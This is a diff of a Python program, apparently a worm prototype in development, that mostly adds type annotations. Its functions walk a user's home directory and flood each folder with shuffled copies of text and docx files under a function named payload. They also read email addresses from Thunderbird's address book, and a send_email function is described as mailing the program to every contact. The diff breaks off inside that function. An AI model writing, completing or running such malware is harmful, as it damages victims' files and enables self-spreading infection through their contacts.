@@ -22,36 +22,33 @@ import mimetypes
 import docx
 import sqlite3
 from datetime import datetime
+import typing
 
 
 # --------------------------------------------------------------------------
 # -------------------- global variables and constants ----------------------
 # --------------------------------------------------------------------------
 
-FILES_TO_WRITE_PER_DIR = 10
+FILES_TO_WRITE_PER_DIR: int = 10
 
+TESTING_DIR = "/home/telekobold/TestVerzeichnis/SS19-Test-Kopie"
 
+# type variables:
+ArbitraryType = typing.TypeVar("ArbitraryType")
+ArbKeyArbValDict = typing.Dict[ArbitraryType, ArbitraryType]
+IntKeyArbValDict = typing.Dict[int, ArbitraryType]
+IntKeyStrValDict = typing.Dict[int, str]
 
 
 # --------------------------------------------------------------------------
 # ----------------------- payload helper functions -------------------------
 # --------------------------------------------------------------------------
 
-def users_home_dir():
-    """
-    :returns: the user's home directory on Unix, Windows and MacOS systems 
-              as string value.
-    """
-    # return os.path.expanduser("~") # platform-independent user's home directory
-    # return "/home/telekobold/TestVerzeichnis/OwnCloud-Test-Kopie" # For testing purposes
-    return "/home/telekobold/TestVerzeichnis/SS19-Test-Kopie" # For testing purposes
-
-
-def is_file_type(file, filetype):
+def is_file_type(file: str, filetype: str) -> bool:
     """
     Tests whether the passed file is of the passed filetype.
     
-    :file:     a relative or absolute file path; must be of type `str`.
+    :file:     a relative or absolute file path.
     :filetype: one of the file types "doc", "docx", "jpeg", "jpg", "mp3", "mp4",
                "odt", "ogg", "png", "txt", "wav"
     :returns: `True` if the passed `file` is of the specified file type, 
@@ -77,13 +74,12 @@ def is_file_type(file, filetype):
     return False
 
 
-def traverse_dirs(curr_dir):
+def traverse_dirs(curr_dir: str) -> None:
     """
     Recursively traverses all directories and subdirectories starting from 
     `curr_dir` and calls the appropriate processing function for each file.
     
-    :curr_dir: the directory to start the traversal as absolute file name;
-               must be of type `str`.
+    :curr_dir: the directory to start the traversal as absolute file name.
     """
     if os.path.islink(curr_dir):
         print("detected symlink {}".format(curr_dir)) # test output
@@ -116,11 +112,11 @@ def traverse_dirs(curr_dir):
             traverse_dirs(os.path.join(curr_dir, file))
             
             
-def read_text_file_to_dict(filename):
+def read_text_file_to_dict(filename: str) -> IntKeyStrValDict:
     """
     Reads the passed text file line by line to a Python dictionary.
     
-    :filename: the absolute file name of a text file; must be of type `str`.
+    :filename: the absolute file name of a text file.
     :returns:  a Python dictionary whose keys are the line numbers (integer 
                values) and the appropriate values being the content of this line 
                (string values) in the text file belonging to the passed
@@ -140,19 +136,19 @@ def read_text_file_to_dict(filename):
     return result
 
 
-def shuffle_filename(filename):
+def shuffle_filename(filename: str) -> str:
     # Determine the lines the text file has and use this number of lines 
     # to randomly shuffle the positions of those lines.
     # TODO: Implement shuffling
     return filename
     
 
-def n_rand_numbers(n):
+def n_rand_numbers(n: int) -> typing.List[int]:
     """
     Before calling this function, please call the function `random.seed` with a 
     non-fixed value.
     
-    :n:       The length of the list to return; must be of type `int`.
+    :n:       The length of the list to return.
     :returns: a list of n numbers between 0 and n, randomly shuffled, 
               but unique (meaning that each number appears only once in the list); 
               `None` for n <= 0.
@@ -170,7 +166,7 @@ def n_rand_numbers(n):
     return result
 
 
-def shuffle_dict_content(dictionary):
+def shuffle_dict_content(dictionary: IntKeyArbValDict) -> IntKeyArbValDict:
     """
     :dictionary: an arbitrary Python dictionary
     :returns:    a Python dictionary which contains the content of the input 
@@ -195,20 +191,20 @@ def shuffle_dict_content(dictionary):
     return result
 
 
-def write_dict_to_text_file(dictionary, filename):
+def write_dict_to_text_file(dictionary: IntKeyArbValDict, filename: str) -> None:
     """
     Writes every value of `dictionary` to a new line of the text file with 
     `filename`.
     
     :dictionary: a Python dictionary
-    :filename:   an absolute file name; must be of type `str`.
+    :filename:   an absolute file name
     """
     with open(filename, "w") as file:
         for i in range(len(dictionary)):
             file.writelines(dictionary[i])
             
             
-def create_filename(input_filename, number):
+def create_filename(input_filename: str, number: int) -> str:
     """
     Converts the passed `number` to a string and writes it at the end of the 
     file name. 
@@ -217,9 +213,9 @@ def create_filename(input_filename, number):
     is written directly before this file name extension. This is currently
     supported for the file name extensions ".txt" and ".docx".
     
-    :input_filename: a relative or absolute file name; must be of type `str`.
+    :input_filename: a relative or absolute file name
     :number:         an `int` value
-    :returns:        `input_filename` with added `number`; has type `str`.
+    :returns:        `input_filename` with added `number`.
     """
     filename = None
     
@@ -235,14 +231,14 @@ def create_filename(input_filename, number):
     
 # TODO: Instead of writing the new files to the same directory as the "host" 
 # file, write them to any existing directory in the user's home directory.
-def process_text_file(input_filename):
+def process_text_file(input_filename: str) -> None:
     """
     Creates `FILES_TO_WRITE_PER_DIR` new text files where each file contains the 
     content of the text file with the past `input_filename`, but with randomly 
     shuffled lines. The new files are created in the same directory as 
     `input_filename`'s directory.
     
-    :input_filename: an absolute file name; must be of type `str`.
+    :input_filename: an absolute file name
     """
     input_file_content = read_text_file_to_dict(input_filename)
     
@@ -256,14 +252,14 @@ def process_text_file(input_filename):
         file_content = shuffle_dict_content(input_file_content)
         write_dict_to_text_file(file_content, filename)
     
-    
-def write_dict_to_docx_file(dictionary, filename):
+
+def write_dict_to_docx_file(dictionary: IntKeyStrValDict, filename: str) -> None:
     """
     Writes every value of `dictionary` to a new line of the docx file with 
     `filename`.
     
     :dictionary: a Python dictionary
-    :filename:   the absolute file name of a docx file; must be of type `str`.
+    :filename:   the absolute file name of a docx file
     """
     document = docx.Document()
     paragraph = document.add_paragraph()
@@ -274,7 +270,7 @@ def write_dict_to_docx_file(dictionary, filename):
 
 # TODO: Add error handling if file opening doesn't work (e.g. because of missing
 # access rights). Instead, just continue to the next file.
-def process_docx_file(input_filename):
+def process_docx_file(input_filename: str) -> None:
     """
     Produces FILES_TO_WRITE_PER_DIR new docx files where each file contains 
     the content of this text file, but with randomly shuffled content.
@@ -329,7 +325,7 @@ def process_music_file(file):
 # --------------------------------------------------------------------------
 
     
-def read_email_addresses_thunderbird():
+def read_email_addresses_thunderbird() -> typing.List[str]:
     """
     :returns: a list of all email addresses contained in Thunderbird's 
               `abook.sqlite` database if this database exists, `None` otherwise.
@@ -377,10 +373,11 @@ for every read file where each file has a randomly generated file name based on
 the file name of the read file and containing the content of the read file, but 
 with the words randomly shuffled.
 """
-def payload():
+def payload() -> None:
     # TODO: The program does nothing if the passed directory doesn't exist.
     print("Started traversing dirs...") # test output
-    traverse_dirs(users_home_dir())
+    # traverse_dirs(os.path.expanduser("~"))
+    traverse_dirs(TESTING_DIR)
     print("Finished traversing dirs!") # test output
 
     
@@ -388,7 +385,7 @@ def payload():
 Send this program to all email addresses in the address book of the installed 
 Thunderbird or Outlook.
 """
-def send_email():
+def send_email() -> None:
     email_addresses = read_email_addresses_thunderbird()
     print(email_addresses) # test output
     # If Mozilla Thunderbird is installed, read the whole address book from 
